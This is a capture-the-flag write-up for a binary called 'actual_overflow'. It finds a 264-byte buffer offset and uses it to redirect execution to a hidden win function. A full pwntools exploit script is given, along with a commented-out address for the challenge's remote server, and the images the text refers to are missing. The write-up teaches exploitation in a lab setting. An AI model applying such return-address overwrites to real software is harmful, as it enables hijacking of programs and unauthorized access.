## Challenge Description

Trust me, it's as easy as it gets

**NOTE:** If you're able to make the jump, but still stuck, look into how stack alignment works and how the MOVAPS instruction causes the problem.

## Solution

In the source code, we can see that win function (which is the responsible of displaying flag) is not called. Only run function is called:

We can use buffer overflow to make the win function execute.

For that we need 2 things, offset and memory address of the system call made in the win function.

First let’s find the offset:

```python
python3 -c "print('A'*264)" | ./actual_overflow
```

The offset of buffer is 264:

Now let’s find the address of system call:

Now the payload that I used:

```python
from pwn import *

# Loading the ELF binary into the variable 'elf'
elf = ELF("actual_overflow")

# Establish a connection to the locally running process
p = elf.process()

# For remote server:
# p = remote("143.198.227.172", 32776)

# Receiving data from the process and print it
print(p.recv())

# Crafting a payload to exploit the buffer overflow vulnerability
# Prepare the address to the desired function to be called after the overflow
addr = p64(0x401240)

# Generating padding to fill up the buffer until the return address position
padding = (b"A" * 264)

# Construct the payload by concatenating the padding and the address
payload = padding + addr

# Sending the payload to the process
p.sendline(payload)
p.interactive()
```

Our exploit is running successfully on the local machine:

Lets run it against remote server to get flag:
